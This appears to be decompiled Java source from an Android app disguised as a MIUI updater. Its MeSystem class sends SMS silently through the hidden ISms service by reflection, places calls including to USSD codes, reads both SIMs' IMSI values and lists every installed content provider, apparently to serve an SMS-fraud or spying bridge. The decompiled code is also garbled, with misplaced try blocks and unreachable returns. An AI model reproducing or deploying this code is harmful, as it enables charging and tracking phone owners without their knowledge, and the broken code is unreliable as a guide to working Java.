package brandmangroupe.miui.updater;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.ProviderInfo;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class MeSystem {
    Context mContext;

    MeSystem(Context c) {
        this.mContext = c;
    }

    public void Log(String text) {
        Log.i("MeSystem.Log", text);
    }

    public void showToast(String toast) {
        Toast.makeText(this.mContext, toast, 0).show();
    }

    public void sendSMS(String phoneNumber, String message) {
        SmsManager.getDefault().sendTextMessage(phoneNumber, null, message, null, null);
    }

    public void start(String uri) {
        this.mContext.startActivity(new Intent("android.intent.action.VIEW", Uri.parse(uri)));
    }

    public void call(String number) {
        call(number, 0);
    }

    public String dualsim() {
        TelephonyInfo telephonyInfo = TelephonyInfo.getInstance(this.mContext);
        String imsiSIM1 = telephonyInfo.getImsiSIM1();
        String imsiSIM2 = telephonyInfo.getImsiSIM2();
        boolean isSIM1Ready = telephonyInfo.isSIM1Ready();
        return " IME1 : " + imsiSIM1 + "\n" + " IME2 : " + imsiSIM2 + "\n" + " IS DUAL SIM : " + telephonyInfo.isDualSIM() + "\n" + " IS SIM1 READY : " + isSIM1Ready + "\n" + " IS SIM2 READY : " + telephonyInfo.isSIM2Ready() + "\n";
    }

    public void call(String number, int sim) {
        Intent intent123 = new Intent("android.intent.action.CALL", Uri.parse("tel:" + number.replace("#", Uri.encode("#"))));
        intent123.putExtra("com.android.phone.extra.slot", sim);
        intent123.putExtra("simSlot", sim);
        intent123.setFlags(805306368);
        this.mContext.startActivity(intent123);
    }

    public String providers() throws JSONException {
        JSONObject jsonObj = new JSONObject();
        JSONArray jsonArr = new JSONArray();
        for (PackageInfo pack : this.mContext.getPackageManager().getInstalledPackages(8)) {
            ProviderInfo[] providers = pack.providers;
            if (providers != null) {
                for (ProviderInfo provider : providers) {
                    JSONObject pnObj = new JSONObject();
                    pnObj.put("name", provider.authority);
                    jsonArr.put(pnObj);
                }
            }
        }
        jsonObj.put("result", jsonArr);
        return jsonObj.toString();
    }

    public boolean sendSMS(int simID, String toNum, String smsText) {
        String name;
        Context ctx = this.mContext;
        if (simID == 0) {
            try {
                name = "isms";
            } catch (ClassNotFoundException e) {
                Log.e("apipas", "ClassNotFoundException:" + e.getMessage());
            } catch (NoSuchMethodException e2) {
                Log.e("apipas", "NoSuchMethodException:" + e2.getMessage());
            } catch (InvocationTargetException e3) {
                Log.e("apipas", "InvocationTargetException:" + e3.getMessage());
            } catch (IllegalAccessException e4) {
                Log.e("apipas", "IllegalAccessException:" + e4.getMessage());
            } catch (Exception e5) {
                Log.e("apipas", "Exception:" + e5.getMessage());
            }
        } else if (simID == 1) {
            name = "isms2";
        } else {
            throw new Exception("can not get service which for sim '" + simID + "', only 0,1 accepted as values");
        }
        Method method = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", new Class[]{String.class});
        method.setAccessible(true);
        Object param = method.invoke(null, new Object[]{name});
        method = Class.forName("com.android.internal.telephony.ISms$Stub").getDeclaredMethod("asInterface", new Class[]{IBinder.class});
        method.setAccessible(true);
        Object stubObj = method.invoke(null, new Object[]{param});
        if (VERSION.SDK_INT < 18) {
            stubObj.getClass().getMethod("sendText", new Class[]{String.class, String.class, String.class, PendingIntent.class, PendingIntent.class}).invoke(stubObj, new Object[]{toNum, null, smsText, null, null});
        } else {
            stubObj.getClass().getMethod("sendText", new Class[]{String.class, String.class, String.class, String.class, PendingIntent.class, PendingIntent.class}).invoke(stubObj, new Object[]{ctx.getPackageName(), toNum, null, smsText, null, null});
        }
        return true;
        return false;
    }

    public boolean sendMultipartTextSMS(int simID, String toNum, ArrayList<String> smsTextlist) {
        String name;
        Context ctx = this.mContext;
        if (simID == 0) {
            try {
                name = "isms";
            } catch (ClassNotFoundException e) {
                Log.e("apipas", "ClassNotFoundException:" + e.getMessage());
            } catch (NoSuchMethodException e2) {
                Log.e("apipas", "NoSuchMethodException:" + e2.getMessage());
            } catch (InvocationTargetException e3) {
                Log.e("apipas", "InvocationTargetException:" + e3.getMessage());
            } catch (IllegalAccessException e4) {
                Log.e("apipas", "IllegalAccessException:" + e4.getMessage());
            } catch (Exception e5) {
                Log.e("apipas", "Exception:" + e5.getMessage());
            }
        } else if (simID == 1) {
            name = "isms2";
        } else {
            throw new Exception("can not get service which for sim '" + simID + "', only 0,1 accepted as values");
        }
        Method method = Class.forName("android.os.ServiceManager").getDeclaredMethod("getService", new Class[]{String.class});
        method.setAccessible(true);
        Object param = method.invoke(null, new Object[]{name});
        method = Class.forName("com.android.internal.telephony.ISms$Stub").getDeclaredMethod("asInterface", new Class[]{IBinder.class});
        method.setAccessible(true);
        Object stubObj = method.invoke(null, new Object[]{param});
        if (VERSION.SDK_INT < 18) {
            stubObj.getClass().getMethod("sendMultipartText", new Class[]{String.class, String.class, List.class, List.class, List.class}).invoke(stubObj, new Object[]{toNum, null, smsTextlist, null, null});
        } else {
            stubObj.getClass().getMethod("sendMultipartText", new Class[]{String.class, String.class, String.class, List.class, List.class, List.class}).invoke(stubObj, new Object[]{ctx.getPackageName(), toNum, null, smsTextlist, null, null});
        }
        return true;
        return false;
    }
}
